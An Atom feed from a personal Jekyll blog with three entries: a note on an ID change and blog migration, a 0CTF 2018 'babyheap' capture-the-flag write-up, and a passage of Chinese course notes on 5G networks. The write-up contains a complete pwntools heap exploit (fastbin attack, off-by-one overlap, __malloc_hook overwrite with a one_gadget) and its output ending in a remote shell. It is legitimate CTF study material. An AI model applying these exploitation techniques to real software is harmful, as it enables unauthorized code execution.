<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-06-11T14:52:02+08:00</updated><id>http://localhost:4000/</id><title type="html">DoubleMice</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">id更改和博客迁移</title><link href="http://localhost:4000/%E6%9D%82%E6%96%87/2018/06/10/e5-8d-9a-e5-ae-a2-e8-bf-81-e7-a7-bb-e5-92-8cid-e6-9b-b4-e6-94-b9.html" rel="alternate" type="text/html" title="id更改和博客迁移" /><published>2018-06-10T11:03:39+08:00</published><updated>2018-06-10T11:03:39+08:00</updated><id>http://localhost:4000/%E6%9D%82%E6%96%87/2018/06/10/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E5%92%8Cid%E6%9B%B4%E6%94%B9</id><content type="html" xml:base="http://localhost:4000/%E6%9D%82%E6%96%87/2018/06/10/e5-8d-9a-e5-ae-a2-e8-bf-81-e7-a7-bb-e5-92-8cid-e6-9b-b4-e6-94-b9.html">&lt;h2&gt;id更改&lt;/h2&gt;
&lt;p&gt;原常用id为Foxwest，现更改为DoubleMice。&lt;br /&gt;
直接影响的有：&lt;br /&gt;

* github:&lt;a herf=&quot;https://github.com/DoubleMice&quot;&gt;https://github.com/DoubleMice&lt;/a&gt;&lt;br /&gt;
* ins:&lt;a href=&quot;https://www.instagram.com/doublemouce/&quot;&gt;https://www.instagram.com/doublemouce/&lt;/a&gt;&lt;br /&gt;
所有能更改id的目前已全部改为DoubleMice。&lt;/p&gt;

&lt;h2&gt;博客迁移&lt;/h2&gt;
&lt;p&gt;wordpress使用起来有些臃肿，不合我一向喜欢简洁的风格。&lt;br /&gt;
做出如下调整：&lt;br /&gt;

* 所有技术类文章迁移至&lt;a href=&quot;https://DoubleMice.github.io&quot;&gt;github pages:https://DoubleMice.github.io&lt;/a&gt;，并且技术类都将放至github pages。&lt;br /&gt;
* 本站点保留所有账户信息、登录权限、现有文章，并且之后本站点只发表私密文章。&lt;br /&gt;
* 永久续费403forbidden.website域名。&lt;/p&gt;</content><author><name>DoubleMice</name></author><summary type="html">id更改 原常用id为Foxwest，现更改为DoubleMice。 直接影响的有：</summary></entry><entry><title type="html">0ctf2018 babyheap</title><link href="http://localhost:4000/pwn/2018/04/27/0ctf2018-babyheap.html" rel="alternate" type="text/html" title="0ctf2018 babyheap" /><published>2018-04-27T15:39:26+08:00</published><updated>2018-04-27T15:39:26+08:00</updated><id>http://localhost:4000/pwn/2018/04/27/0ctf2018-babyheap</id><content type="html" xml:base="http://localhost:4000/pwn/2018/04/27/0ctf2018-babyheap.html">&lt;h2&gt;&lt;a name=&quot;babyheap&quot;&gt;babyheap&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;exploit method:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;leak heap_addr
&lt;ul&gt;
&lt;li&gt;fastbin attack&lt;/li&gt;
&lt;li&gt;off-by-one overlap&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;leak main_arena
&lt;ul&gt;
&lt;li&gt;unsorted bin attack&lt;/li&gt;
&lt;li&gt;off-by-one overlap&lt;/li&gt;
&lt;li&gt;main_arena = unsorted bin - offset&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;leak libc_base
&lt;ul&gt;
&lt;li&gt;libc_base = main_arena - offset'&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;fastbin attack to control top_chunk
&lt;ul&gt;
&lt;li&gt;top_chunk point to near __malloc_hook&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;use one_gadget to rewrite __malloc_hook&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;leak&lt;/h3&gt;
&lt;p&gt;fastbin attack&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;single link&lt;/li&gt;
&lt;li&gt;LIFO&lt;/li&gt;
&lt;li&gt;structure&lt;br /&gt;
sizeof(A/B/C) = 0x30.&lt;br /&gt;
free(A),free(B),free(C),then we get:&lt;br /&gt;
A-&gt;fd = B&lt;br /&gt;
B-&gt;fd = C&lt;br /&gt;
C-&gt;fd = 0&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;off-by-one overlap&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;chunk A,B,C&lt;/li&gt;
&lt;li&gt;overflow A to pollute the size area of B,then get B'&lt;/li&gt;
&lt;li&gt;in C,build a fake chunk C' to bypass the size check&lt;br /&gt;
condition:&lt;code&gt;SIZE(B)+SIZE(C)=SIZE(B')+SIZE(C')&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;addition knowledge&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;on x86-64,chunk alignment:0x?8 size area get 0x(?+1)0&lt;/li&gt;
&lt;li&gt;chunk A is an unsorted bin,A-&gt;fd = A-&gt;bk = A_addr&lt;/li&gt;
&lt;li&gt;main_arena - certain offset = libc_base&lt;br /&gt;
see &lt;code&gt;cat /proc/pid/maps&lt;/code&gt; in shell or &lt;code&gt;vmmap&lt;/code&gt; in peda to get libc_base,then offset = main_arena - libc_base&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;exp&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;#!/usr/bin/python -u
# encoding: utf-8
from pwn import *
import sys

# context(log_level='debug')


def allocate(size):
    p.recvuntil('Command: ')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))

def update(id,size,content):
    p.recvuntil('Command: ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(id))
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Content: ')
    print &quot;[#]update chunk:&quot;,str(id)
    p.sendline(content)

def delete(id):
    p.recvuntil('Command: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    print &quot;[#]delete chunk:&quot;,str(id)
    p.sendline(str(id))

def view(id):
    p.recvuntil('Command: ')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(id))

def redlog(msg):
    return &quot;[&quot; + &quot;&lt;pre wp-pre-tag-0&gt;&lt;/pre&gt;33[0;31m%s&lt;pre wp-pre-tag-0&gt;&lt;/pre&gt;33[0m&quot; % &quot;+&quot; + &quot;]&quot; + msg + &quot;:&quot;




def exploit(p):
    allocate(0x10)
    allocate(0x28)
    allocate(0x20)#2
    allocate(0x20)

    #leak heap
    update(1,0x29,'a'*0x28+'\x51')
    update(3,0x20,p64(1)+p64(1)+p64(0)+p64(0x21))

    delete(2)
    allocate(0x40)#2
    update(2,0x30,'a'*0x20+p64(-1,sign=signed)+p64(0x21))
    delete(0)
    delete(3)
    view(2)
    p.recvuntil(&quot;: &quot;)
    data=p.recvuntil(&quot;\n&quot;)[0x30:][:8]
    heap=u64(data)
    print redlog(&quot;heap&quot;),hex(heap)

    # leak main_arena
    allocate(0x10) #0
    allocate(0x58) #3
    allocate(0x58) #4


    update(2,0x30,'A'*0X20+p64(0)+p64(0X91))
    update(3,0x51,p64(0xdeadbeef)*11 + p64(0x21))

    delete(0)
    view(2)
    p.recvuntil(&quot;: &quot;)
    data=p.recvuntil(&quot;\n&quot;)[0x30:][:8]
    main_arena = u64(data)-0x58
    libc_offset = 0x399b00
    libc = main_arena - libc_offset
    print redlog(&quot;main_arena&quot;),hex(main_arena)
    print redlog(&quot;libc_offset&quot;),hex(libc_offset)
    print redlog(&quot;libc&quot;),hex(libc)

    # control top_chunk
    allocate(0x58) #0
    allocate(0x28) #5
    allocate(0x58)
    # update(5,0x10,p64(0)+p64(0x41))
    update(2,0x30,p64(0xdeadbeef)*4+p64(0)+p64(0x51))
    update(0,0x50,p64(0xdeadbeef)*8+p64(0)+p64(0x41))
    # update(4,0x10,'\x44'*0x10)
    update(5,0x29,p64(0xdeadbeef)*5+chr(0x51))
    update(4,0x50,p64(0xdeadbeef)*8+p64(0)+p64(0x71))
    delete(4)
    delete(0)
    delete(6)

    # edit top_chunk
    fake = main_arena + 37
    fake_top = main_arena - 0x33
    update(2,0x40,p64(0xdeadbeef)*5+p64(0x51)+p64(fake)+p64(0xdeadbeef))
    allocate(0x10) #0
    allocate(0x48) #4
    # gdb.attach(p)
    allocate(0x48) #6
    update(6,0x33-8,'\x00'*3+p64(0xcafebabe)*4+p64(fake_top))
    one_gadget = libc+0x3f35a
    print redlog(&quot;one_gadget:&quot;),hex(one_gadget)
    allocate(0x30) #7
    update(7,0x20,&quot;\x33&quot;*3+p64(0xdeadbeef)*2+p64(one_gadget)+p64(0xdeadbeef))
    # gdb.attach(p)
    allocate(0x10)
    p.interactive()

    p.close()


if __name__==&quot;__main__&quot;:
    if len(sys.argv)&lt;2 :
        p = process(&quot;./babyheap&quot;)
        # p = process('./babyheap',env={'LD_PRELOAD':'./libc.so'})
    else:
        p = remote(sys.argv[1],int(sys.argv[2]))
    exploit(p)

&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;foxwest@ubuntu:~/Desktop/pwn/babyheap$ python o.py 202.120.7.204 127
[+] Opening connection to 202.120.7.204 on port 127: Done
[#]update chunk: 1
[#]update chunk: 3
[#]delete chunk: 2
[#]update chunk: 2
[#]delete chunk: 0
[#]delete chunk: 3
[+]heap: 0x5610e84a4000
[#]update chunk: 2
[#]update chunk: 3
[#]delete chunk: 0
[+]main_arena: 0x7ff07ed79b00
[+]libc_offset: 0x399b00
[+]libc: 0x7ff07e9e0000
[#]update chunk: 2
[#]update chunk: 0
[#]update chunk: 5
[#]update chunk: 4
[#]delete chunk: 4
[#]delete chunk: 0
[#]delete chunk: 6
[#]update chunk: 2
[#]update chunk: 6
[+]one_gadget:: 0x7ff07ea1f35a
[#]update chunk: 7
[*] Switching to interactive mode
$ ls home/babyheap
babyheap
flag
$ 
&lt;/code&gt;&lt;/pre&gt;</content><author><name>DoubleMice</name></author><summary type="html">babyheap exploit method: leak heap_addr fastbin attack off-by-one overlap leak main_arena unsorted bin attack off-by-one overlap main_arena = unsorted bin - offset leak libc_base libc_base = main_arena - offset' fastbin attack to control top_chunk top_chunk point to near __malloc_hook use one_gadget to rewrite __malloc_hook leak fastbin attack single link LIFO structure sizeof(A/B/C) = 0x30. free(A),free(B),free(C),then we get: A-&gt;fd = B B-&gt;fd = C C-&gt;fd = 0 off-by-one overlap chunk A,B,C overflow A to pollute the size area of B,then get B' in C,build a fake chunk C' to bypass the size check condition:SIZE(B)+SIZE(C)=SIZE(B')+SIZE(C') addition knowledge on x86-64,chunk alignment:0x?8 size area get 0x(?+1)0 chunk A is an unsorted bin,A-&gt;fd = A-&gt;bk = A_addr main_arena - certain offset = libc_base see cat /proc/pid/maps in shell or vmmap in peda to get libc_base,then offset = main_arena - libc_base exp #!/usr/bin/python -u # encoding: utf-8 from pwn import * import sys</summary></entry><entry><title type="html">5th generation mobile networks</title><link href="http://localhost:4000/course/2018/04/07/5th-generation-mobile-networks.html" rel="alternate" type="text/html" title="5th generation mobile networks" /><published>2018-04-07T16:36:48+08:00</published><updated>2018-04-07T16:36:48+08:00</updated><id>http://localhost:4000/course/2018/04/07/5th-generation-mobile-networks</id><content type="html" xml:base="http://localhost:4000/course/2018/04/07/5th-generation-mobile-networks.html">&lt;p&gt;写给《计算机通信基础》结课ppt。&lt;/p&gt;
&lt;h2&gt;目录&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#whatwillbe5g&quot;&gt;&quot;What will be 5G?&quot;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#feature&quot;&gt;特点&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#engneed&quot;&gt;工程需求&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#rate&quot;&gt;数据速率&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#mixrate&quot;&gt;聚合数据速率或区域容量&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#edgerate&quot;&gt;边缘速率&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#peakrate&quot;&gt;峰值速率&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#realrate&quot;&gt;5G实际传输速率&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#delay&quot;&gt;延迟&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#Ecost&quot;&gt;能量花费&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#Ff&quot;&gt;频谱效率&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#Ifeature&quot;&gt;接入设备特点&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#keytech&quot;&gt;提升速率的关键技术&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#OFDM-MDI&quot;&gt;基于OFDM优化的波形和多址接入&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#ExOFDM&quot;&gt;通过子载波间隔扩展实现可扩展的OFDM参数配置&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#Mrate&quot;&gt;通过OFDM加窗提高多路传输效率&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#framework&quot;&gt;灵活的框架设计&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#Exgap&quot;&gt;可扩展的时间间隔&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#Inframe&quot;&gt;自包含集成子帧&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#wireless&quot;&gt;先进的新型无线技术&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#MMIMO&quot;&gt;大规模MIMO&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#MMwave&quot;&gt;毫米波&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#Fshare&quot;&gt;频谱共享&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#codedesign&quot;&gt;先进的信道编码设计&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#process&quot;&gt;进展&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#bottleneck&quot;&gt;瓶颈&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#state&quot;&gt;现状&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#thread&quot;&gt;安全威胁&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#segmarket&quot;&gt;5G的细分市场&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#diffthread&quot;&gt;不同应用场景的威胁&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a name=&quot;whatwillbe5g&quot;&gt;&quot;What will be 5G?&quot;&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;1~5G development&lt;br /&gt;
&lt;img src=&quot;https://static.leiphone.com/uploads/new/article/740_740/201705/590fedfaeffcd.jpg?imageMogr2/format/jpg/quality/90&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;5G&lt;br /&gt;
&lt;img src=&quot;https://pic1.zhimg.com/80/a2c1a673983028dcadf77001ab96c0f1_hd.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a name=&quot;feature&quot;&gt;特点&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;日前，国际电信联盟（ITU）发布了最新的5G标准草案，根据这份草案，单个5G基站至少必须具备20Gbps下行链路的处理能力，而据雷锋网了解，目前LTE基站只支持1Gbps的下行链路。此外，未来的5G标准还要求每平方公里必须支持100万台连接设备，运营商则必须至少有100MHz的空闲频谱，在可行的情况下还可以扩大到1Ghz。&lt;/p&gt;
&lt;h4&gt;&lt;a name=&quot;engneed&quot;&gt;工程需求&lt;/a&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;快&lt;/li&gt;
&lt;li&gt;低能耗&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;&lt;a name=&quot;rate&quot;&gt;数据速率&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;衡量指标细分：&lt;/p&gt;
&lt;h6&gt;&lt;a name=&quot;mixrate&quot;&gt;聚合数据速率或区域容量&lt;/a&gt;&lt;/h6&gt;
&lt;p&gt;通信系统能够同时支持的总的数据速率，单位是单位面积上的bits/s。相比于上一代的4G通信系统，5G的局和数据速率要求提高1000倍以上。&lt;/p&gt;
&lt;h6&gt;&lt;a name=&quot;edgerate&quot;&gt;边缘速率&lt;/a&gt;&lt;/h6&gt;
&lt;p&gt;指的是当用户处于系统边缘时，例如处于小区中离基站最远的位置，用户可能会遇到的传输速率最差的情况，也就是数据速率的下限。又因为一般取传输速率最差的5%的用户作为衡量边缘速率的标准，边缘速率又称为5%速率。对于该指标，5G的目标是100Mbps到1Gbps，这一指标比相比于4G典型的1Mbps的边缘速率，要求提高了至少100倍。&lt;/p&gt;
&lt;h6&gt;&lt;a name=&quot;peakrate&quot;&gt;峰值速率&lt;/a&gt;&lt;/h6&gt;
&lt;p&gt;指的是所有条件最好的情况下，用户能够达到的最大速率。5G甚至有望达到10Gbps的量级。&lt;/p&gt;
&lt;p&gt;该标准要求单个5G基站至少能够支持20Gbps的下行链路以及10Gbps的上行链路，这是单个基站可以处理的总流量。理论上，如果固定的无线宽带用户使用专用的点到点连接，那么他们可以获得接近5G的速度。实际上，基站覆盖范围内的用户将分配使用20Gbps以及10Gbps这一数据吞吐量。&lt;/p&gt;
&lt;h6&gt;&lt;a name=&quot;realrate&quot;&gt;5G实际传输速率&lt;/a&gt;&lt;/h6&gt;
&lt;p&gt;不管单个5G基站的峰值容量是多少，该草案要求每个用户的下载和上传速度必须达到100Mbps以及50Mbps。这些听起来和LTE-Advanced很接近，但是5G能够让你一直保持100Mbps的下载速度，而不是靠运气。&lt;/p&gt;
&lt;p&gt;除此之外，该草案还要求增强5G的稳定性和可靠性，例如数据包必须在1ms内到达基站，并且切换5G基站的中断时间应该为0ms，也就是说切换过程是瞬时的，中间不允许有数据丢失。&lt;br /&gt;
&lt;img src=&quot;https://static.leiphone.com/uploads/new/article/740_740/201702/58b3dccd5a42e.jpg?imageMogr2/format/jpg/quality/90&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h5&gt;&lt;a name=&quot;delay&quot;&gt;延迟&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;现在4G系统的往返延迟是15ms，其中1ms用于基站给用户分配信道和接入方式产生的必要信令开销。虽然4G的15ms相对于绝大多数服务而言，已经是很够用了。 但随着科技发展，之后兴起的一些设备需要更低的延迟，比如移动云计算和可穿戴设备的联网。&lt;/p&gt;
&lt;p&gt;在理想情况下，5G网络的延迟最大不能超过4ms，而LTE网络对延迟的要求则是20ms。不过，要想实现超稳定低延迟通信（URLLC），5G的延迟必须低于1ms。&lt;/p&gt;
&lt;h5&gt;&lt;a name=&quot;Ecost&quot;&gt;能量花费&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;随着我们转向5G网络，通信所花费的能耗应该越来越低。但前文提到，用户的数据速率至少需要提高100倍，这就要求5G中传输每比特信息所花费的能耗需要降低至少100倍。而现在能量消耗的一大部分在于复杂的信令开销，例如网络边缘基站传回基站的回程信号。而5G网络，由于基站部署更加密集，这一开销会更多。因此，5G必须要提高能量的利用率。&lt;/p&gt;
&lt;p&gt;&lt;b&gt;5G规范要求在负载下保持高能效，并且在空闲的状态下能够迅速切换成低能耗模式。为了实现这一点，5G无线电必须在10ms内从全速模式切换到节能模式。&lt;b&gt;&lt;/p&gt;
&lt;h5&gt;&lt;a name=&quot;Ff&quot;&gt;频谱效率&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;从草案的规定来看，5G的峰值频谱效率（每赫兹频谱传输的比特）与LTE-advanced非常接近，都是上行30bits/Hz、下行15bits/Hz，这相当于8x4 MIMO。&lt;/p&gt;
&lt;h4&gt;&lt;a name=&quot;Ifeature&quot;&gt;接入设备特点&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;5G网络需要有更强的服务能力，能够同时接入更多的用户。随着机机（machine-to-machine，意为设备到另一设备）通信技术的发展，单一宏蜂窝应该能够支持超过1000个低传输速率设备，同时还要能继续支持普通的高传输速率设备。&lt;/p&gt;
&lt;h3&gt;&lt;a name=&quot;keytech&quot;&gt;提升速率的关键技术&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;C＝W log2(1+S/N)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://pic4.zhimg.com/80/v2-fd23633e9317ccd1b1b401714460f6a9_hd.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a name=&quot;OFDM-MDI&quot;&gt;基于OFDM优化的波形和多址接入&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;5G NR设计过程中最重要的一项决定，就是采用基于OFDM优化的波形和多址接入技术，因为OFDM 技术被当今的 4G LTE 和 Wi-Fi 系统广泛采用，因其可扩展至大带宽应用，而具有高频谱效率和较低的数据复杂性，因此能够很好地满足 5G 要求。 OFDM 技术家族可实现多种增强功能，例如通过加窗或滤波增强频率本地化、在不同用户与服务间提高多路传输效率，以及创建单载波 OFDM 波形，实现高能效上行链路传输。&lt;br /&gt;
&lt;img src=&quot;https://pic3.zhimg.com/80/v2-b8c214fd37402b06c94d1d04fe000735_hd.jpg&quot; alt=&quot;基于OFDM优化&quot; /&gt;&lt;br /&gt;
OFDM有以下优势：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;复杂度低（Low complexity）：可以兼容低复杂度的信号接收器，比如移动设备&lt;/li&gt;
&lt;li&gt;频谱效率高（High spectral efficiency:）：可以高效使用 MIMO，提高数据传输效率。&lt;/li&gt;
&lt;li&gt;能耗少（Low power consumption）：可以通过单载波波形，实现高能效上行链路传输。&lt;/li&gt;
&lt;li&gt;频率局域化（Frequencylocalization）：可以通过加窗和滤波，提升频率局域化，最大限度减少信号干扰。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;&lt;a name=&quot;ExOFDM&quot;&gt;通过子载波间隔扩展实现可扩展的OFDM参数配置&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://pic3.zhimg.com/80/v2-f3d59b5201f32e9a73e8c4be5ac39baf_hd.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
目前，通过OFDM子载波之间的15 kHz间隔（固定的OFDM参数配置），LTE最高可支持20 MHz的载波带宽。为了支持更丰富的频谱类型/带（为了连接尽可能丰富的设备，5G将利用所有能利用的频谱，如毫米微波、非授权频段）和部署方式。5G NR将引入可扩展的OFDM间隔参数配置。这一点至关重要，因为当FFT（Fast Fourier Transform，快速傅里叶变换）为更大带宽扩展尺寸时，必须保证不会增加处理的复杂性。而为了支持多种部署模式的不同信道宽度，如上图所示，5G NR必须适应同一部署下不同的参数配置，在统一的框架下提高多路传输效率。另外，5G NR也能跨参数实现载波聚合，比如聚合毫米波和6GHz以下频段的载波，因而也就具有更强的连接性能。&lt;/p&gt;
&lt;h5&gt;&lt;a name=&quot;Mrate&quot;&gt;通过OFDM加窗提高多路传输效率&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;前文提到，5G 将被应用于大规模物联网，这意味着会有数十亿设备在相互连接，5G势必要提高多路传输的效率，以应对大规模物联网的挑战。为了相邻频带不相互干扰，频带内和频带外信号辐射必须尽可能小。OFDM能实现波形后处理（post-processing），如时域加窗或频域滤波，来提升频率局域化。如下图，利用5G NR OFDM的参数配置，5G可以在相同的频道内进行多路传输。&lt;br /&gt;
&lt;img src=&quot;https://pic2.zhimg.com/80/v2-511639c6f497e4d5069b681cc2faab3b_hd.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
面对这一需求，Qualcomm正积极推动CP-OFDM（循环前缀正交频分复用）加窗技术，大量的分析和试验结果表明，它能有效减少频带内和频带外的辐射，从而显著提高频率局域化。CP-OFDM技术的效果已被实践证实，现在正广泛应用于LTE网络体系中。&lt;/p&gt;
&lt;h4&gt;&lt;a name=&quot;framework&quot;&gt;灵活的框架设计&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;显然，要实现5G的大范围服务，仅有基于OFDM优化的波形和多址接入技术是远远不够的。设计5G NR的同时，还在设计一种灵活的5G 网络架构，以进一步提高5G服务多路传输的效率。这种灵活性即体现在频域，更体现在时域上，5G NR的框架能充分满足5G的不同的服务和应用场景。&lt;br /&gt;
&lt;img src=&quot;https://pic7.zhimg.com/80/v2-c7c94066e14a43d6fd0aa3e38af8d281_hd.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h5&gt;&lt;a name=&quot;Exgap&quot;&gt;可扩展的时间间隔&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;相比当前的 4G LTE网络，5G NR将使时延降低一个数量级。目前LTE网络中，TTI（时间间隔）固定在1 ms（毫秒）。为此，3GPP在4G演进的过程中提出一个降低时延的项目。尽管技术细节还不得而知，但这一项目的规划目标就是要将一次傅里叶变换的时延降低为目前的1/8（即从1.14ms降低至143&amp;micro;s（微秒））。而为了支持&amp;ldquo;长时延需求&amp;rdquo;的服务，5G NR的灵活框架设计可以向上或向下扩展TTI（即使用更长或更短的TTI），依具体需求而变。&lt;/p&gt;
&lt;p&gt;除此之外，5G NR同样支持同一频率下以不同的TTI进行多路传输。比如，高Qos（服务质量）要求的移动宽带服务可以选择使用500 &amp;micro;s的TTI，而不是像LTE时代只能用标准TTI，同时，另一个对时延很敏感的服务可以用上更短的TTI，比如140 &amp;micro;s，而不是非得等到下一个子帧到来，也就是500 &amp;micro;s以后。也就是说上一次传输结束以后，两者可以同时开始，从而节省了等待时间。&lt;/p&gt;
&lt;h5&gt;&lt;a name=&quot;Inframe&quot;&gt;自包含集成子帧&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;自包含集成子帧是另一项关键技术，对降低时延、向前兼容和其他一系列5G特性意义重大。通过把数据的传输（transmission）和确认（acknowledgement）包含在一个子帧内，时延可显著降低。下图展示的是一个TDD下行链路子帧，从网络到设备的数据传输和从设备发回的确认信号都在同一个子帧内。而且通过5G NR独立集成子帧，每个TTI都以模块化处理完成，比如同意下载&amp;rarr;数据下行&amp;rarr;保护间隔&amp;rarr;上行确认。&lt;br /&gt;
&lt;img src=&quot;https://pic1.zhimg.com/80/v2-d3a4804de23ab0618fe9a20b656d9569_hd.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
模块化同样支持不同类型的子帧为未来的各种新服务进行多路传输，配合5G NR框架支持空白子帧和空白频率资源的设计，使其拥有向前兼容性&amp;mdash;&amp;mdash;未来的新型服务可以以同步或非同步状态部署在同一频率内。&lt;/p&gt;
&lt;h4&gt;&lt;a name=&quot;wireless&quot;&gt;先进的新型无线技术&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;我们在开头提到过，5G必然是在充分利用现有技术的基础之上，充分创新才能实现的，而4G LTE正是目前最先进的移动网络平台，5G在演进的同时，LTE本身也还在不断进化（比如最近实现的千兆级4G+），5G不可避免地要利用目前用在4G LTE上的先进技术，如载波聚合，MIMO技术，非共享频谱的利用，等等；可以说，5G在很大程度上是以4G为基础的。&lt;/p&gt;
&lt;h5&gt;&lt;a name=&quot;MMIMO&quot;&gt;大规模MIMO&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;MIMO（Multiple-Input Multiple-Output）技术是目前无线通信领域的一个重要创新研究项目，通过智能使用多根天线（设备端或基站端），发射或接受更多的信号空间流，能显著提高信道容量；而通过智能波束成型，将射频的能量集中在一个方向上，可以提高信号的覆盖范围。这两项优势足以使其成为5G NR的核心技术之一，因此一直在努力推进MIMO技术的演化，比如从2x2提高到了目前4x4 MIMO。但更多的天线也意为着占用更多的空间，要在空间有限的设备中容纳进更多天线显然不现实，所以，只能在基站端叠加更多MIMO。从目前的理论来看，5G NR可以在基站端使用最多256根天线，而通过天线的二维排布，可以实现3D波束成型，从而提高信道容量和覆盖。&lt;/p&gt;
&lt;h5&gt;&lt;a name=&quot;MMwave&quot;&gt;毫米波&lt;/a&gt;&lt;/h5&gt;
